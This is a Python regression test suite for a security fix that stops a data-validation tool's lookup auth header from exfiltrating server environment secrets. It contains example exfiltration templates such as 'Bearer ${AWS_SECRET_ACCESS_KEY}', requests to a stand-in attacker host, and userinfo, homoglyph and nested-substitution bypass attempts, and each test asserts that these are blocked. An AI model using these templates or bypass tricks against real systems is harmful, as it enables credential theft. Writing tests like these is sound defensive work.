"""SEC-011 — lookup_auth_header env-var secret-exfiltration guard.

Regression suite for the v2.3.28 fix. The vulnerability: `lookup_auth_header`
supported `${VAR}` substitution over the entire process environment, and a
contract author controls both the header template and the destination URL, so
`lookup_auth_header: "Bearer ${AWS_SECRET_ACCESS_KEY}"` + a public attacker URL
exfiltrated any server secret (CWE-526). The SEC-008 SSRF guard did not stop it
— the destination is a legitimate public host.

Fix: three layered controls in validator._resolve_lookup_auth_header —
  1. only OPENDQV_LOOKUP_-prefixed env vars are substitutable (else hard-fail),
  2. under AUTH_MODE=open substitution is off unless OPENDQV_ALLOW_LOOKUP_SECRETS,
  3. a secret-bearing lookup host must be on OPENDQV_LOOKUP_EGRESS_ALLOWLIST
     (fail-closed) and redirects are not followed.

Every case Sonnet's pre-merge red-team raised has a test here.
"""

from contextlib import ExitStack
from unittest.mock import MagicMock, patch

import pytest

import opendqv.config as config
from opendqv.core.validator import (
    LookupAuthPolicyError,
    _resolve_lookup_auth_header,
    _canonical_host,
    _load_http_lookup_set,
    _http_lookup_cache,
)


# ── fixtures / helpers ─────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def _clear_cache():
    _http_lookup_cache.clear()
    yield
    _http_lookup_cache.clear()


@pytest.fixture
def token_mode(monkeypatch):
    """AUTH_MODE=token (a real trust boundary). Open-mode control #2 is inert."""
    monkeypatch.setattr(config, "IS_OPEN_MODE", False)
    monkeypatch.setattr(config, "ALLOW_LOOKUP_SECRETS_IN_OPEN_MODE", False)


@pytest.fixture
def allow_api_example(monkeypatch):
    monkeypatch.setattr(config, "LOOKUP_EGRESS_ALLOWLIST", frozenset({"api.example"}))


def _dns_patch():
    import socket
    return patch("socket.getaddrinfo", return_value=[
        (socket.AF_INET, socket.SOCK_STREAM, 0, "", ("93.184.216.34", 0))
    ])


# ── control #1 — prefix allowlist ──────────────────────────────────────────

class TestPrefixAllowlist:
    def test_nonprefixed_var_hardfails(self, token_mode, allow_api_example, monkeypatch):
        monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "super-secret")
        with pytest.raises(LookupAuthPolicyError):
            _resolve_lookup_auth_header("Bearer ${AWS_SECRET_ACCESS_KEY}",
                                        "https://api.example/list")

    def test_prefixed_var_resolves_on_allowlisted_host(self, token_mode,
                                                        allow_api_example, monkeypatch):
        monkeypatch.setenv("OPENDQV_LOOKUP_OFAC", "ofac-key")
        resolved, secret_bearing = _resolve_lookup_auth_header(
            "Bearer ${OPENDQV_LOOKUP_OFAC}", "https://api.example/list")
        assert resolved == "Bearer ofac-key"
        assert secret_bearing is True

    def test_literal_header_is_unguarded(self, monkeypatch):
        # No ${...} → no server secret involved → returned as-is, not secret-bearing.
        monkeypatch.setattr(config, "LOOKUP_EGRESS_ALLOWLIST", frozenset())
        resolved, secret_bearing = _resolve_lookup_auth_header(
            "Bearer literal-token", "https://anywhere.example")
        assert resolved == "Bearer literal-token"
        assert secret_bearing is False

    def test_mixed_refs_one_bad_hardfails(self, token_mode, allow_api_example, monkeypatch):
        monkeypatch.setenv("OPENDQV_LOOKUP_A", "a")
        monkeypatch.setenv("SECRET_KEY", "b")
        with pytest.raises(LookupAuthPolicyError):
            _resolve_lookup_auth_header(
                "X ${OPENDQV_LOOKUP_A} ${SECRET_KEY}", "https://api.example")

    def test_no_recursive_expansion(self, token_mode, allow_api_example, monkeypatch):
        # A resolved value that itself looks like ${...} must NOT be re-expanded.
        monkeypatch.setenv("OPENDQV_LOOKUP_X", "${SECRET_KEY}")
        monkeypatch.setenv("SECRET_KEY", "leaked")
        resolved, _ = _resolve_lookup_auth_header(
            "Bearer ${OPENDQV_LOOKUP_X}", "https://api.example")
        assert resolved == "Bearer ${SECRET_KEY}"
        assert "leaked" not in resolved

    def test_nested_brace_ref_not_bypassable(self, token_mode, allow_api_example, monkeypatch):
        # ${OPENDQV_LOOKUP_${INJ}} — the inner name captured is not prefix-clean.
        monkeypatch.setenv("INJ", "SECRET_KEY")
        monkeypatch.setenv("SECRET_KEY", "leaked")
        # The captured name is "OPENDQV_LOOKUP_${INJ" — still resolves via env.get
        # (empty), and the residual "}" stays literal. It must NOT leak SECRET_KEY.
        resolved, _ = _resolve_lookup_auth_header(
            "Bearer ${OPENDQV_LOOKUP_${INJ}}", "https://api.example")
        assert "leaked" not in resolved


# ── control #2 — AUTH_MODE=open posture ─────────────────────────────────────

class TestOpenModePosture:
    def test_open_mode_disables_substitution(self, monkeypatch, allow_api_example):
        monkeypatch.setattr(config, "IS_OPEN_MODE", True)
        monkeypatch.setattr(config, "ALLOW_LOOKUP_SECRETS_IN_OPEN_MODE", False)
        monkeypatch.setenv("OPENDQV_LOOKUP_OFAC", "ofac-key")
        # Even a well-formed, allowlisted, prefixed ref is refused in open mode.
        with pytest.raises(LookupAuthPolicyError):
            _resolve_lookup_auth_header(
                "Bearer ${OPENDQV_LOOKUP_OFAC}", "https://api.example/list")

    def test_open_mode_optin_reenables(self, monkeypatch, allow_api_example):
        monkeypatch.setattr(config, "IS_OPEN_MODE", True)
        monkeypatch.setattr(config, "ALLOW_LOOKUP_SECRETS_IN_OPEN_MODE", True)
        monkeypatch.setenv("OPENDQV_LOOKUP_OFAC", "ofac-key")
        resolved, secret_bearing = _resolve_lookup_auth_header(
            "Bearer ${OPENDQV_LOOKUP_OFAC}", "https://api.example/list")
        assert resolved == "Bearer ofac-key"
        assert secret_bearing is True

    def test_open_mode_literal_header_still_allowed(self, monkeypatch):
        # A literal (non-secret) header is unaffected by the open-mode gate.
        monkeypatch.setattr(config, "IS_OPEN_MODE", True)
        monkeypatch.setattr(config, "ALLOW_LOOKUP_SECRETS_IN_OPEN_MODE", False)
        resolved, secret_bearing = _resolve_lookup_auth_header(
            "Bearer literal", "https://anywhere.example")
        assert resolved == "Bearer literal"
        assert secret_bearing is False


# ── control #3 — egress allowlist (the load-bearing control) ────────────────

class TestEgressAllowlist:
    def test_empty_allowlist_fails_closed(self, token_mode, monkeypatch):
        monkeypatch.setattr(config, "LOOKUP_EGRESS_ALLOWLIST", frozenset())
        monkeypatch.setenv("OPENDQV_LOOKUP_K", "k")
        with pytest.raises(LookupAuthPolicyError):
            _resolve_lookup_auth_header(
                "Bearer ${OPENDQV_LOOKUP_K}", "https://api.example")

    def test_allowed_secret_to_nonallowlisted_host_blocked(self, token_mode,
                                                            allow_api_example, monkeypatch):
        # THE load-bearing case: prefix is fine, but the attacker's own host is
        # not allowlisted, so the legitimate OFAC key cannot be shipped out.
        monkeypatch.setenv("OPENDQV_LOOKUP_OFAC", "ofac-key")
        with pytest.raises(LookupAuthPolicyError):
            _resolve_lookup_auth_header(
                "Bearer ${OPENDQV_LOOKUP_OFAC}", "https://attacker.example/collect")

    def test_userinfo_at_bypass_blocked(self, token_mode, allow_api_example, monkeypatch):
        monkeypatch.setenv("OPENDQV_LOOKUP_K", "k")
        # host is attacker.example, not api.example — userinfo must not fool it.
        with pytest.raises(LookupAuthPolicyError):
            _resolve_lookup_auth_header(
                "Bearer ${OPENDQV_LOOKUP_K}", "https://api.example@attacker.example/")

    def test_trailing_dot_matches(self, token_mode, allow_api_example, monkeypatch):
        monkeypatch.setenv("OPENDQV_LOOKUP_K", "k")
        resolved, _ = _resolve_lookup_auth_header(
            "Bearer ${OPENDQV_LOOKUP_K}", "https://api.example./list")
        assert resolved == "Bearer k"

    def test_case_insensitive_host_matches(self, token_mode, allow_api_example, monkeypatch):
        monkeypatch.setenv("OPENDQV_LOOKUP_K", "k")
        resolved, _ = _resolve_lookup_auth_header(
            "Bearer ${OPENDQV_LOOKUP_K}", "https://API.Example/list")
        assert resolved == "Bearer k"

    def test_homogloph_host_blocked(self, token_mode, allow_api_example, monkeypatch):
        # Cyrillic 'а' in "аpi.example" IDNA-encodes to xn--… — must not match.
        monkeypatch.setenv("OPENDQV_LOOKUP_K", "k")
        with pytest.raises(LookupAuthPolicyError):
            _resolve_lookup_auth_header(
                "Bearer ${OPENDQV_LOOKUP_K}", "https://аpi.example/list")

    def test_canonical_host_helper(self):
        assert _canonical_host("API.Example.") == "api.example"
        assert _canonical_host("") is None
        assert _canonical_host("аllowed.example") == "xn--llowed-2nf.example"


# ── redirect handling — OWASP: don't forward the credential ─────────────────

class TestNoRedirectForSecretBearing:
    def test_secret_bearing_uses_no_redirect_opener(self, token_mode,
                                                     allow_api_example, monkeypatch):
        import json
        monkeypatch.setenv("OPENDQV_LOOKUP_K", "k")
        mock_resp = MagicMock()
        mock_resp.headers = {"Content-Type": "application/json"}
        mock_resp.read.return_value = json.dumps(["A"]).encode()
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)

        with ExitStack() as stack:
            stack.enter_context(_dns_patch())
            no_redirect = stack.enter_context(
                patch("opendqv.core.validator._no_redirect_opener.open",
                      return_value=mock_resp))
            ssrf = stack.enter_context(
                patch("opendqv.core.validator._ssrf_safe_opener.open",
                      return_value=mock_resp))
            result = _load_http_lookup_set(
                "https://api.example/list", "", 60,
                auth_header="Bearer ${OPENDQV_LOOKUP_K}")
        assert result == frozenset({"A"})
        assert no_redirect.called, "secret-bearing lookup must use the no-redirect opener"
        assert not ssrf.called, "secret-bearing lookup must NOT use the redirect-following opener"

    def test_no_redirect_handler_raises_on_3xx(self):
        # OWASP: a credential-bearing request must not follow a redirect. The
        # handler raises (fail-closed) rather than returning None (which urllib
        # would treat as "serve the 3xx body").
        import io
        import urllib.error
        from opendqv.core.validator import _NoRedirectHandler
        handler = _NoRedirectHandler()
        req = MagicMock()
        req.full_url = "https://api.example/list"
        with pytest.raises(urllib.error.HTTPError):
            handler.redirect_request(
                req, io.BytesIO(b""), 302, "Found", {},
                "https://attacker.example/collect")

    def test_nonauth_lookup_uses_ssrf_opener(self, token_mode, monkeypatch):
        import json
        mock_resp = MagicMock()
        mock_resp.headers = {"Content-Type": "application/json"}
        mock_resp.read.return_value = json.dumps(["A"]).encode()
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)

        with ExitStack() as stack:
            stack.enter_context(_dns_patch())
            no_redirect = stack.enter_context(
                patch("opendqv.core.validator._no_redirect_opener.open",
                      return_value=mock_resp))
            ssrf = stack.enter_context(
                patch("opendqv.core.validator._ssrf_safe_opener.open",
                      return_value=mock_resp))
            _load_http_lookup_set("https://api.example/list", "", 60, auth_header=None)
        assert ssrf.called
        assert not no_redirect.called


# ── failure boundary — a policy violation never populates the cache ─────────

class TestFailureBoundary:
    def test_policy_violation_does_not_cache_or_fetch(self, token_mode,
                                                      allow_api_example, monkeypatch):
        monkeypatch.setenv("SECRET_KEY", "leaked")
        with ExitStack() as stack:
            stack.enter_context(_dns_patch())
            no_redirect = stack.enter_context(
                patch("opendqv.core.validator._no_redirect_opener.open"))
            ssrf = stack.enter_context(
                patch("opendqv.core.validator._ssrf_safe_opener.open"))
            with pytest.raises(LookupAuthPolicyError):
                _load_http_lookup_set(
                    "https://api.example/list", "", 60,
                    auth_header="Bearer ${SECRET_KEY}")
        assert not no_redirect.called and not ssrf.called, "no fetch on policy violation"
        assert len(_http_lookup_cache) == 0, "policy-violating config must never cache"

    def test_conditional_lookup_fails_closed(self, token_mode, allow_api_example, monkeypatch):
        # _check_conditional_lookup shares _load_http_lookup_set — verify the
        # conditional handler also fails closed on a SEC-011 policy violation.
        from opendqv.core.validator import _check_conditional_lookup
        from opendqv.core.rule_parser import Rule
        monkeypatch.setenv("SECRET_KEY", "leaked")
        rule = Rule(name="r", type="conditional_lookup", field="x",
                    lookup_file="https://api.example/list",
                    lookup_auth_header="Bearer ${SECRET_KEY}",
                    error_message="blocked")
        assert _check_conditional_lookup("present-value", rule) == "blocked"

    def test_policy_error_never_logs_secret(self, token_mode, allow_api_example,
                                            monkeypatch, caplog):
        # The resolved secret and the raw template must never reach the logs.
        import logging
        monkeypatch.setenv("SECRET_KEY", "leaked-secret-value")
        with caplog.at_level(logging.DEBUG):
            with pytest.raises(LookupAuthPolicyError) as exc:
                _resolve_lookup_auth_header(
                    "Bearer ${SECRET_KEY}", "https://api.example/list")
        assert "leaked-secret-value" not in caplog.text
        assert "leaked-secret-value" not in str(exc.value)

    def test_multi_rule_cache_isolation(self, token_mode, allow_api_example, monkeypatch):
        # Two rules, same URL, different auth headers must not share a cache
        # entry — the cache key carries the raw auth-header template.
        import json
        monkeypatch.setenv("OPENDQV_LOOKUP_A", "aaa")
        monkeypatch.setenv("OPENDQV_LOOKUP_B", "bbb")
        seen_auth = []
        mock_resp = MagicMock()
        mock_resp.headers = {"Content-Type": "application/json"}
        mock_resp.read.return_value = json.dumps(["X"]).encode()
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)

        def _capture(req, timeout=10):
            seen_auth.append(req.get_header("Authorization"))
            return mock_resp

        with ExitStack() as stack:
            stack.enter_context(_dns_patch())
            stack.enter_context(
                patch("opendqv.core.validator._no_redirect_opener.open", side_effect=_capture))
            _load_http_lookup_set("https://api.example/list", "", 300,
                                  auth_header="Bearer ${OPENDQV_LOOKUP_A}")
            _load_http_lookup_set("https://api.example/list", "", 300,
                                  auth_header="Bearer ${OPENDQV_LOOKUP_B}")
        # Both fetched (no cross-rule cache hit), each with its own resolved secret.
        assert seen_auth == ["Bearer aaa", "Bearer bbb"]

    def test_single_record_lookup_fails_closed(self, token_mode, allow_api_example, monkeypatch):
        # End-to-end: a bad-prefix auth header marks the record invalid, and does
        # NOT crash — the _check_lookup handler catches ValueError → error_message.
        from opendqv.core.validator import validate_record
        from opendqv.core.rule_parser import Rule
        monkeypatch.setenv("SECRET_KEY", "leaked")
        rules = [Rule(name="r", type="lookup", field="x",
                      lookup_file="https://api.example/list",
                      lookup_auth_header="Bearer ${SECRET_KEY}",
                      error_message="lookup unavailable")]
        result = validate_record({"x": "anything"}, rules)
        assert result["valid"] is False

    def test_batch_lookup_policy_violation_fails_closed(self, token_mode,
                                                        allow_api_example, monkeypatch):
        # The batch path historically fails OPEN on infra errors; a SEC-011
        # policy violation must instead fail CLOSED — every record subject to the
        # rule is marked failing, not silently skipped.
        pytest.importorskip("duckdb")
        from opendqv.core.validator import validate_batch
        from opendqv.core.rule_parser import Rule
        monkeypatch.setenv("SECRET_KEY", "leaked")
        records = [{"x": "a"}, {"x": "b"}]
        rules = [Rule(name="r", type="lookup", field="x",
                      lookup_file="https://api.example/list",
                      lookup_auth_header="Bearer ${SECRET_KEY}",
                      error_message="lookup unavailable")]
        result = validate_batch(records, rules)
        assert result["summary"]["failed"] == 2, "policy violation must fail all records closed"
        assert result["results"][0]["valid"] is False
        assert result["results"][1]["valid"] is False
